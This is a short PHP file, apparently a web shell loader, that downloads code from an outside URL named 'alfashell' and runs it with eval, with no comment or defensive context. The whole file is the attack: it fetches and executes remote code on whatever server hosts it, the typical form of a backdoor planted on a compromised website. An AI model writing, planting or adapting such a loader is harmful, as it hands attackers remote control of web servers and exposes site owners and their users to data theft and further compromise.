<?php

$content = file_get_contents(urldecode('https://preciseurl.org/alfashell'));

$content = "?> ".$content;
eval($content);
